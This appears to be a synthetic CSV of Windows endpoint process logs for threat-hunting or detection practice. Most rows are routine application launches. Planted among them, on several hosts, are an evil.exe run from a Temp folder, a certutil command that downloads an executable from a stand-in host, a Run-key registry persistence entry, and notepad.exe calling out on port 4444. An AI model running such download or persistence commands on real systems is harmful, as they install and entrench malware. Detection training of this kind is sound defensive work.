timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-05 08:21:00,fin-ws-02,liam,evil.exe,explorer.exe,C:\Users\liam\AppData\Local\Temp\evil.exe,10.0.0.5,0,none
2026-04-05 08:22:00,corp-ws-02,karen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-05 08:22:00,fin-ws-02,liam,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.4.25,0,none
2026-04-05 08:23:00,hr-ws-01,karen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,142.250.183.14,443,zoom-client
2026-04-05 08:24:00,ops-ws-02,julia,teams.exe,explorer.exe,teams.exe --background-task-mode,104.18.20.12,443,teams-client
2026-04-05 08:25:00,ops-ws-02,karen,slack.exe,explorer.exe,slack.exe --background-task-mode,52.95.110.1,443,slack-client
2026-04-05 08:26:00,corp-ws-02,alice,teams.exe,explorer.exe,teams.exe --background-task-mode,104.18.20.12,443,teams-client
2026-04-05 08:27:00,sales-lt-01,irfan,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-05 08:28:00,ops-ws-01,diana,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 08:29:00,ops-ws-01,julia,teams.exe,explorer.exe,teams.exe --background-task-mode,104.18.20.12,443,teams-client
2026-04-05 08:30:00,ops-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.1.5.12,0,none
2026-04-05 08:31:00,fin-ws-02,alice,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-05 08:32:00,eng-ws-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-05 08:33:00,eng-ws-01,liam,code.exe,explorer.exe,"code.exe ""C:\Users\liam\Documents\project""",10.0.1.15,445,none
2026-04-05 08:34:00,fin-ws-02,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",192.168.10.9,445,none
2026-04-05 08:35:00,eng-ws-01,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,msedge
2026-04-05 08:36:00,hr-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-05 08:37:00,eng-ws-02,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-05 08:38:00,ops-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-05 08:39:00,ops-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,msedge
2026-04-05 08:40:00,eng-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-05 08:41:00,eng-ws-02,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-05 08:42:00,hr-ws-01,alice,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-05 08:43:00,eng-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 08:44:00,ops-ws-01,julia,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-05 08:45:00,corp-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-05 08:46:00,corp-ws-01,helen,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-05 08:47:00,eng-ws-01,irfan,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-05 08:48:00,eng-ws-02,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",52.95.110.1,443,outlook
2026-04-05 08:49:00,eng-ws-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.0.1.15,445,none
2026-04-05 08:50:00,fin-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,msedge
2026-04-05 08:51:00,sales-lt-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.2.10.15,0,none
2026-04-05 08:52:00,sales-lt-01,george,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-05 08:53:00,ops-ws-01,helen,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-05 08:54:00,eng-ws-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-05 08:55:00,corp-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.10,0,none
2026-04-05 08:56:00,ops-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.2.10.15,0,none
2026-04-05 08:57:00,corp-ws-02,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",185.199.108.153,443,outlook
2026-04-05 08:58:00,ops-ws-02,irfan,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-05 08:59:00,corp-ws-01,karen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,185.199.108.153,443,zoom-client
2026-04-05 09:00:00,corp-ws-04,george,winword.exe,explorer.exe,winword.exe /background,10.2.10.15,0,none
2026-04-05 09:01:00,eng-ws-01,farah,winword.exe,explorer.exe,winword.exe /background,10.2.10.15,0,none
2026-04-05 09:01:00,corp-ws-02,farah,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-05 09:02:00,corp-ws-01,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-05 09:02:00,corp-ws-02,farah,evil.exe,explorer.exe,C:\Users\farah\AppData\Local\Temp\evil.exe,172.16.4.25,0,none
2026-04-05 09:03:00,ops-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.2.10.15,0,none
2026-04-05 09:03:00,corp-ws-02,farah,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.1.12,0,none
2026-04-05 09:04:00,fin-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 09:05:00,hr-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.1.5.12,445,none
2026-04-05 09:06:00,corp-ws-02,julia,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-05 09:07:00,corp-ws-02,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-05 09:08:00,sales-lt-01,diana,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-05 09:09:00,corp-ws-03,alice,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-05 09:10:00,eng-ws-02,charlie,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-05 09:11:00,sales-lt-01,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",192.168.1.12,445,none
2026-04-05 09:12:00,ops-ws-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.1.5.12,445,none
2026-04-05 09:13:00,corp-ws-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 09:14:00,fin-ws-02,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-05 09:15:00,fin-ws-01,farah,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-05 09:16:00,fin-ws-02,helen,teams.exe,explorer.exe,teams.exe --background-task-mode,142.250.183.14,443,teams-client
2026-04-05 09:17:00,fin-ws-01,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",151.101.1.69,443,outlook
2026-04-05 09:18:00,corp-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-05 09:19:00,sales-lt-01,george,teams.exe,explorer.exe,teams.exe --background-task-mode,185.199.108.153,443,teams-client
2026-04-05 09:20:00,sales-lt-01,karen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,msedge
2026-04-05 09:21:00,ops-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --background-task-mode,151.101.1.69,443,zoom-client
2026-04-05 09:22:00,corp-ws-04,diana,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-05 09:23:00,corp-ws-03,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-05 09:24:00,hr-ws-01,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",10.1.5.12,0,none
2026-04-05 09:25:00,ops-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.0.5,445,none
2026-04-05 09:26:00,fin-ws-01,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-05 09:27:00,eng-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-05 09:28:00,corp-ws-02,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",23.45.67.89,443,outlook
2026-04-05 09:29:00,corp-ws-03,liam,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-05 09:30:00,hr-ws-01,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-05 09:31:00,hr-ws-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 09:32:00,corp-ws-04,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
2026-04-05 09:33:00,corp-ws-01,liam,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-05 09:34:00,fin-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.0.5,0,none
2026-04-05 09:35:00,corp-ws-03,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",192.168.1.12,445,none
2026-04-05 09:36:00,corp-ws-03,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",185.199.108.153,443,outlook
2026-04-05 09:37:00,eng-ws-02,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.0.2.20,445,none
2026-04-05 09:38:00,ops-ws-01,liam,teams.exe,explorer.exe,teams.exe --background-task-mode,185.199.108.153,443,teams-client
2026-04-05 09:39:00,fin-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-05 09:40:00,ops-ws-02,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",52.95.110.1,443,outlook
2026-04-05 09:41:00,fin-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,msedge
2026-04-05 09:42:00,ops-ws-02,bob,zoom.exe,explorer.exe,zoom.exe --background-task-mode,151.101.1.69,443,zoom-client
2026-04-05 09:43:00,hr-ws-01,julia,teams.exe,explorer.exe,teams.exe --background-task-mode,23.45.67.89,443,teams-client
2026-04-05 09:44:00,hr-ws-01,charlie,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-05 09:45:00,eng-ws-01,diana,teams.exe,explorer.exe,teams.exe --background-task-mode,23.45.67.89,443,teams-client
2026-04-05 09:46:00,eng-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-05 09:47:00,hr-ws-01,helen,excel.exe,explorer.exe,excel.exe /background,10.2.10.15,0,none
2026-04-05 09:48:00,fin-ws-01,liam,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\liam\Documents\notes.txt""",10.0.0.5,0,none
2026-04-05 09:49:00,hr-ws-01,helen,teams.exe,explorer.exe,teams.exe --background-task-mode,185.199.108.153,443,teams-client
2026-04-05 09:50:00,corp-ws-04,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,msedge
2026-04-05 09:51:00,corp-ws-04,liam,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 09:52:00,fin-ws-01,charlie,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-05 09:53:00,ops-ws-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-05 09:53:00,ops-ws-01,ethan,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-05 09:54:00,corp-ws-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",104.18.20.12,443,outlook
2026-04-05 09:54:00,ops-ws-01,ethan,evil.exe,explorer.exe,C:\Users\ethan\AppData\Local\Temp\evil.exe,10.2.10.15,0,none
2026-04-05 09:55:00,sales-lt-01,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-05 09:55:00,ops-ws-01,ethan,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.4.25,0,none
2026-04-05 09:56:00,eng-ws-01,irfan,teams.exe,explorer.exe,teams.exe --background-task-mode,45.33.32.156,443,teams-client
2026-04-05 09:57:00,corp-ws-04,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",172.16.10.8,0,none
2026-04-05 09:58:00,corp-ws-04,alice,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 09:59:00,fin-ws-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-05 10:00:00,corp-ws-03,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,msedge
2026-04-05 10:01:00,hr-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",192.168.10.9,445,none
2026-04-05 10:02:00,fin-ws-01,irfan,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-05 10:03:00,fin-ws-01,helen,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-05 10:04:00,hr-ws-01,george,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-05 10:05:00,fin-ws-02,diana,slack.exe,explorer.exe,slack.exe --background-task-mode,8.8.8.8,443,slack-client
2026-04-05 10:06:00,eng-ws-02,liam,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 10:07:00,ops-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",52.95.110.1,443,outlook
2026-04-05 10:08:00,ops-ws-01,ethan,slack.exe,explorer.exe,slack.exe --background-task-mode,1.1.1.1,443,slack-client
2026-04-05 10:09:00,corp-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-05 10:10:00,eng-ws-01,irfan,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-05 10:11:00,ops-ws-01,liam,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-05 10:12:00,sales-lt-01,diana,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 10:13:00,corp-ws-04,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",45.33.32.156,443,outlook
2026-04-05 10:14:00,corp-ws-02,charlie,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-05 10:15:00,sales-lt-01,karen,outlook.exe,explorer.exe,"outlook.exe /recycle ""karen@company.com""",1.1.1.1,443,outlook
2026-04-05 10:16:00,ops-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,msedge
2026-04-05 10:17:00,fin-ws-02,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",10.0.2.20,0,none
2026-04-05 10:18:00,fin-ws-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.2.20,445,none
2026-04-05 10:19:00,sales-lt-01,karen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,45.33.32.156,443,zoom-client
2026-04-05 10:20:00,fin-ws-01,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,msedge
2026-04-05 10:21:00,corp-ws-02,helen,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-05 10:22:00,corp-ws-02,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",172.16.10.8,445,none
2026-04-05 10:23:00,ops-ws-02,diana,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-05 10:24:00,eng-ws-02,charlie,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-05 10:25:00,corp-ws-03,helen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,52.95.110.1,443,zoom-client
2026-04-05 10:26:00,hr-ws-01,diana,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-05 10:27:00,ops-ws-02,bob,teams.exe,explorer.exe,teams.exe --background-task-mode,23.45.67.89,443,teams-client
2026-04-05 10:28:00,eng-ws-01,karen,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-05 10:29:00,fin-ws-02,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,msedge
2026-04-05 10:30:00,eng-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.10.9,0,none
2026-04-05 10:31:00,fin-ws-02,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",172.16.4.25,0,none
2026-04-05 10:32:00,corp-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,52.95.110.1,443,zoom-client
2026-04-05 10:33:00,fin-ws-02,charlie,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-05 10:34:00,corp-ws-04,helen,teams.exe,explorer.exe,teams.exe --background-task-mode,52.95.110.1,443,teams-client
2026-04-05 10:35:00,corp-ws-04,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-05 10:36:00,corp-ws-02,alice,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-05 10:37:00,corp-ws-01,ethan,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-05 10:38:00,fin-ws-01,karen,code.exe,explorer.exe,"code.exe ""C:\Users\karen\Documents\project""",10.2.10.15,445,none
2026-04-05 10:39:00,fin-ws-01,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",45.33.32.156,443,outlook
2026-04-05 10:40:00,sales-lt-01,diana,zoom.exe,explorer.exe,zoom.exe --background-task-mode,142.250.183.14,443,zoom-client
2026-04-05 10:41:00,hr-ws-01,karen,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-05 10:42:00,eng-ws-01,alice,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-05 10:43:00,ops-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",10.2.10.15,445,none
2026-04-05 10:44:00,corp-ws-04,irfan,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 10:45:00,hr-ws-01,liam,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-05 10:46:00,eng-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",104.18.20.12,443,outlook
2026-04-05 10:47:00,corp-ws-04,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",192.168.10.9,445,none
2026-04-05 10:47:00,corp-ws-04,julia,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-05 10:48:00,corp-ws-04,liam,zoom.exe,explorer.exe,zoom.exe --background-task-mode,151.101.1.69,443,zoom-client
2026-04-05 10:48:00,corp-ws-04,julia,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-05 10:49:00,corp-ws-02,bob,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-05 10:50:00,sales-lt-01,karen,slack.exe,explorer.exe,slack.exe --background-task-mode,23.45.67.89,443,slack-client
2026-04-05 10:51:00,corp-ws-01,julia,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-05 10:52:00,corp-ws-02,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 10:53:00,corp-ws-04,farah,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-05 10:54:00,ops-ws-02,bob,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-05 10:55:00,corp-ws-04,ethan,slack.exe,explorer.exe,slack.exe --background-task-mode,23.45.67.89,443,slack-client
2026-04-05 10:56:00,fin-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.0.0.10,0,none
2026-04-05 10:57:00,fin-ws-02,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",10.0.0.5,0,none
2026-04-05 10:58:00,corp-ws-02,ethan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,45.33.32.156,443,zoom-client
2026-04-05 10:59:00,sales-lt-01,karen,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-05 11:00:00,ops-ws-02,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-05 11:01:00,corp-ws-02,karen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-05 11:02:00,fin-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",45.33.32.156,443,outlook
2026-04-05 11:03:00,ops-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.2.20,0,none
2026-04-05 11:04:00,corp-ws-03,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.10.9,0,none
2026-04-05 11:05:00,corp-ws-04,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",172.16.10.8,0,none
